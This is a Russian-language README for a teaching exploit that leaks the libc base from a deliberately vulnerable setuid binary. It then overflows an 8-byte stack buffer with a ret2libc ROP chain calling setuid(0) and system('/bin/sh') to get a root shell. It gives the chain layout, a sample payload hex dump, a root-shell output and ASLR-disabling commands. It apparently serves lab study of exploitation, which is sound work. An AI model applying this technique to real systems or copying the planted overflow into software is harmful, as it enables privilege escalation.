# LibcLeak2Root Exploit: LEAK + ret2libc ROP

## Описание

Учебный локальный эксплойт для бинарника `b0f_large`, демонстрирующий:

- утечку базы `libc` через `link_map` (команда `LEAK`);
- автоматический поиск смещений (`system`, `setuid`, `/bin/sh`, `pop rdi; ret`);
- построение ROP-цепочки для вызова `setuid(0)` и `system("/bin/sh")`;
- получение root-шелла при установке бинарника как setuid-root.

Эксплойт не содержит жёстко закодированных адресов и работает с ASLR.

## Требования

- Debian или производный дистрибутив
- `gcc`, `g++`, `make`
- `libc6-dev`
- `gdb` (опционально, для отладки)

Установка зависимостей:

```bash
sudo apt update
sudo apt install -y build-essential gdb
```

## Сборка

```bash
make clean && make
```

В результате будут собраны:
 - b0f_large — уязвимая программа;
 - exploit — эксплойт.

## Подготовка цели

Если требуется получить root-шелл, установите b0f_large как setuid-root:

```bash
sudo chown root:root b0f_large
sudo chmod 4755 b0f_large
```

Проверка:

```bash
ls -l b0f_large
# Должно быть: -rwsr-xr-x 1 root root ... b0f_large
```

## Запуск

```bash
./exploit
```

После успешного выполнения вы попадёте в интерактивную shell-сессию от имени пользователя, запустившего эксплойт.
Если бинарник setuid-root, shell будет с правами root.

## Как это работает

### Уязвимости в b0f_large

Форматная строка
Ввод имени передаётся в printf(cmd), что позволяет читать и записывать память.
В эксплойте не используется, но присутствует как альтернативный путь.

Переполнение буфера
Буфер char s[8] читается через fgets(s, 256, stdin).
Это даёт перезапись сохранённого RIP и построение ROP-цепочки.

Утечка libc
Команда LEAK вызывает dlopen/dlinfo(RTLD_DI_LINKMAP) и печатает l_addr — базовый адрес libc в процессе.

### Автоматическое определение смещений (auto_offsets)

Модуль auto_offsets выполняет:

- поиск libc в памяти процесса через dl_iterate_phdr;
- определение базового адреса libc;
- поиск строки /bin/sh в файле libc;
- поиск гаджета pop rdi; ret (байты 5f c3) в исполняемом сегменте;
- получение адресов system и setuid через dlsym.

Все смещения вычисляются относительно базы libc и возвращаются в структуре LibcOffsets.

### ROP-цепочка

Смещение до сохранённого RIP — 24 байта.

Для получения root-шелла используется цепочка:

```bash
pop rdi; ret
0
setuid
pop rdi; ret
/bin/sh
system
```

Выравнивание стека не требуется, так как количество элементов чётное и соответствует ожидаемому состоянию при входе в system.

### Альтернативный режим (без root)

Если в exploit.cpp установить WANT_ROOT = false, будет построена цепочка:

```bash
pop rdi; ret
/bin/sh
ret (выравнивание)
system
```

Она даёт обычный shell от текущего пользователя.

### Пример вывода эксплойта

```bash
=== ROP Exploit (LEAK + auto offsets) ===
[*] Libc path: /lib/x86_64-linux-gnu/libc.so.6
[*] Libc base in exploit process: 0x7ffff7dc0000
[+] Offset system: 0x4f420
[+] Offset setuid: 0xe4e30
[+] Offset /bin/sh: 0x1b3e1a
[+] Found pop rdi; ret at 0x7ffff7e0b123 (offset 0x4b123)
[+] ret (align) offset: 0x4b124
[*] Waiting for name prompt...
[*] Got: [Enter your name: ]
[*] Sending LEAK...
[*] Leak line: [LEAKED: 0x7ffff7dc0000
]
[+] LIBC base: 0x7ffff7dc0000
[*] ROP gadgets:
  pop rdi; ret : 0x7ffff7e0b123
  ret (align)  : 0x7ffff7e0b124
  /bin/sh      : 0x7ffff7f73e1a
  setuid       : 0x7ffff7ea4e30
  system       : 0x7ffff7e0f420
[*] Got: [Enter your message: ]
[*] Payload size: 72 bytes
[*] Payload hex:
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
41 41 41 41 41 41 41 41 23 b1 e0 f7 ff 7f 00 00 
00 00 00 00 00 00 00 00 30 4e ea f7 ff 7f 00 00 
23 b1 e0 f7 ff 7f 00 00 1a 3e f7 f7 ff 7f 00 00 
20 f4 e0 f7 ff 7f 00 00 
[*] Sending ROP payload...
[+] Shell should be spawned!
[+] Dropping to interactive shell...
uid=0(root) gid=0(root) groups=0(root)
root
```

### Отключение ASLR (опционально)

Эксплойт работает и с включённым ASLR, но для отладки можно временно отключить:

```bash
sudo sysctl -w kernel.randomize_va_space=0
./exploit
sudo sysctl -w kernel.randomize_va_space=2
```

### Восстановление прав

После завершения эксперимента верните обычные права:

```bash
sudo chmod 755 b0f_large
sudo chown $USER:$USER b0f_large
```

## Дисклеймер

Данный код предназначен исключительно для образовательных целей и тестирования в контролируемой среде.
Не используйте его против систем, которые вам не принадлежат.
Автор не несёт ответственности за любой ущерб, вызванный использованием этого кода.
